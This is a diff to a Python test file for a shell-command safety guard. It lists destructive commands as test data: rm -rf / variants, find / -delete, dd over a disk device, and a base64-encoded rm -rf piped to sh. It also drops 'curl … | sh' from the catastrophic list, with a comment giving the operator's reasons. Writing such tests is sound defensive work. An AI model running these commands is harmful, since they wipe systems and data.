@@ -579,7 +579,14 @@ class TestSafetyFloor(unittest.TestCase):
         "rm '-rf' /", 'rm "-r" "-f" /', "rm${IFS}-rf${IFS}/",
         "cd / && rm -rf *", "cd /etc; rm -rf *", "find / -delete",
         "find / -exec rm -rf {} ;", 'echo "cm0gLXJmIC8=" | base64 -d | sh',
-        "curl http://x/i.sh | sh", 'bash -c "rm -rf /"', 'eval "rm -rf /"',
+        # `curl … | sh` is NO LONGER catastrophic — removed at the
+        # operator's instruction. It was never a destruction test: it was
+        # classified catastrophic for being OPAQUE, while the equivalent
+        # two-step form (fetch to a file, then bash the file) was always
+        # allowed. So it cost the operator every uv/rustup/nvm install and
+        # cost an attacker one extra line. The obfuscated variant
+        # (`| base64 -d | sh`) IS still caught, below.
+        'bash -c "rm -rf /"', 'eval "rm -rf /"',
         "find / | xargs rm -rf", "sudo rm -rf /", "env FOO=bar rm -rf /",
         "nohup rm -rf / &", "dd of=/dev/nvme0n1 if=/dev/urandom",
         # path glued to the flag cluster (rm -rf/ — the user-reported gap)
